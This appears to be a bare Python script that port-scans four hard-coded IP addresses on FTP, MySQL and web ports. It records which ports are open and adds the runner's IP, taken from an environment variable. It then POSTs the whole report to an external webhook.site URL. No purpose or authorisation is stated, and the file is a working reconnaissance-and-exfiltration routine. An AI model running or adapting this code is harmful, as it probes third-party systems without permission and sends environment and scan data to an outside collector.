import socket, urllib.request, os, json, time
HOSTS=["103.20.215.96","103.20.213.118","103.20.214.68","103.20.214.150"]
PORTS=[21,3306,3307,80,443,8443]
out=[]
for h in HOSTS:
    for p in PORTS:
        s=socket.socket(); s.settimeout(5)
        t=time.time()
        try:
            s.connect((h,p)); out.append("OPEN %s:%d %.1fs"%(h,p,time.time()-t))
        except Exception as e:
            out.append("closed %s:%d %s %.1fs"%(h,p,type(e).__name__,time.time()-t))
        finally: s.close()
body=("RUNNER_IP "+os.environ.get("RIP","?")+"\n"+"\n".join(out)).encode()
print(body.decode())
try:
    r=urllib.request.urlopen(urllib.request.Request("https://webhook.site/48cc5f93-9625-4813-b1e0-99e457ca12d2",data=body,method="POST",headers={"Content-Type":"text/plain"}),timeout=25)
    print("post",r.status)
except Exception as e:
    print("post fail",repr(e)[:200])
